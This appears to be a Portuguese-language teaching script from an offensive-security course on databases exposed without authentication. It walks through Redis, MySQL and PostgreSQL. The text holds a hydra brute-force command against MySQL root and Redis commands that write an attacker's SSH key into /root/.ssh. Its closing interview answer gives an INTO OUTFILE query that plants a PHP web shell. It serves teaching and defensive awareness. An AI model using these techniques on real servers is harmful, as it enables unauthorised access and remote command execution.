#!/bin/bash
# ==============================================================================
# Módulo 3: Vulnerabilidades em Serviços
# Aula 03 - Bancos de Dados Expostos (Redis, MySQL, PostgreSQL sem auth)
# ==============================================================================
#
# 1. ANALOGIA DO DIA A DIA
# A Aplicação Web (porta 80) é o Caixa do Banco. O Database (porta 3306) é o gigantesco 
# cofre forte no fundo do lote que armazena os lingotes. A premissa de segurança
# urbana básica dita que o cofre NUNCA deva ter portinha pra a Rua pros pedestres verem,
# apenas pra o balcão. Um Banco de Dados Exposto é um dev maluco que botou IP-público
# configurado pro Redis na Internet (Binder) e SEM senha! É LITERALEMNTE deixar o 
# cofre no meio da calçada na praça central!
#
# 2. O QUE É (definição técnica Senior)
# Devido a migração de Docker massivas, a falha gravíssima de "Bind Address 0.0.0.0" 
# e instâncias Sem Auth no deploy de bancos NoSQL / RDBMS subiu 600%.
#   - Redis (6379): Banco In-Memory Key-Value. Default? Vem SEM senha (Sem mecanismo ACL)
#     esperando que você proteja na vLan. Mas jogue em open e um maluco vaza teus caches ou te faz ransomware.
#   - MySQL(3306) / PostgreSQL(5432): Configurações legadas permitindo wildcard no Host (`root@%`) 
#     dando acesso global ou dev setol senha `admin/admin` p/ o phpmyadmin local.
#
# ==============================================================================
# 3. SCRIPT / COMANDO COMENTADO
# ==============================================================================

TARGET="127.0.0.1" 

# ================= REDIS (6379 TCP) Pwning =================
# Checando acesso livre de Redis In-Memory bypass de autenticação.
# Usamos o cliente nativo. Se "PING" responder "+PONG", não há barreira ACL auth!
echo "[+] Conectando em Socket REDIS Exposto e Dumpeando configs vivas:"
# redis-cli -h $TARGET ping
# redis-cli -h $TARGET info replication
# redis-cli -h $TARGET keys "*" 

# ================= MYSQL (3306 TCP) Pwning =================
# Bruteforce simples se estiver exposto (O MariaDB/MySQL deveria tar rodando bind 127.0.0.1 apenas)
echo "[+] Hydrando MySQL Default passwords de SysAdmin..."
# hydra -l root -P top10.txt mysql://$TARGET

# Client Login MySQL Shell (se sabe a credencial ou testando vazias `root` sem `-p`)
# mysql -h $TARGET -u root -p

# ==============================================================================
# 4. PASSO A PASSO
# ==============================================================================
# Passo 1: Nmap porta 6379 TCP e achou Redis-Server.
# Passo 2: Digite `redis-cli -h IP`. Caiu no portprompt liso: `10.0.0.5:6379>`.
# Passo 3: O atacante percebe que DB é bobo... Mas pode me dar RCE System-Level (Shell)?
# Passo 4: SIM. Ele muda o local dos backups do Redis em RUN-TIME para o `/root/.ssh/`.
# `10...6379> config set dir /root/.ssh/`
# `10...6379> config set dbfilename "authorized_keys"`
# Passo 5: Ele injeta a CHAVE PÚBLICA DELE de attacker para dentro de uma variavel em RAM no redis e manda o redis SALVAR PARA O DISCO FISICO no crontab ou .ssh!
# Passo 6: Ele só vira pro terminal agora e puxa: `ssh root@IP`. E cai direto no servidor! A falha do banco casou falha do sistema.
#
# 5. VERIFICAÇÃO E TROUBLESHOOTING
# Quando se conecta PostgreSQL na 5432 exposta via bash `psql -h IP -U postgres`, ocorre frequentemente 
# erros "FATAL: pg_hba.conf rejects". Isso é excelente para o Defensivo, pois demonstra que o banco PostgreSQL possui uma camada nativa extra de Firewall Application (o hba conf) que explicitamente rejeita IP's IPs invasosres mesmo de senha certa.
# 
# 6. CONCEITO SENIOR (o "porquê" profundo)
# Existe um motivo pro Sênior não aceitar desculpas em arquitetura 3-Tier com banco exposto. 
# Quando invadimos um Apache (Tier 1) mal configurado por uma RCE, nós ganhamos acesso `www-data`.
# A conta web raramente é root. Mas como o Apache se alimenta de dados, ele TEM q ter IP de Trust para a porta localzinha 3306 do MySQL. Daí você pega o MySQL pelo MySQL e explora O BANCO (por um UDF library bug via MySQL Root-DB) e pula do banco PRA EXECUTAR comando OS COMO ROOT (porque infelizmente o deamon Mysql foi bootado de Root na master systemd do OS em vez de usuario "mysql" drop-caps...). Pescamos de Tier1 pro Tier2, explora Tier2 e domina o servidor inteiro como Sytem (Tier3 hardware).
#
# 7. PERGUNTA DE ENTREVISTA / CTF
# Pergunta: "Seu nmap 3306 revela MySQL. O Admin cometeu o gravissimo erro de ativar o parâmetro de configuracao 'secure_file_priv'='vazio' ou desabilitado, achando q tava tudo bem no DB. Você conectou com as senhas admin123 de uma falhinha. Como tu gera RCE brutal no disco no OS Linux a partir de uma query SQL normal de cliente e rouba servidor?"
# Resposta Esperada: O bypass clássico de File Write local! Eu emito um SQL statement de `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';`. A proteção natural de file Privileges estando desligava confia na injeção bruta. O código cria fisicamente no disco um php com backdoor! Então eu só ligo firefox em `http://IP/shell.php?cmd=id`, transformando meu DB login em OS Command Execution Remoto via PHP render!
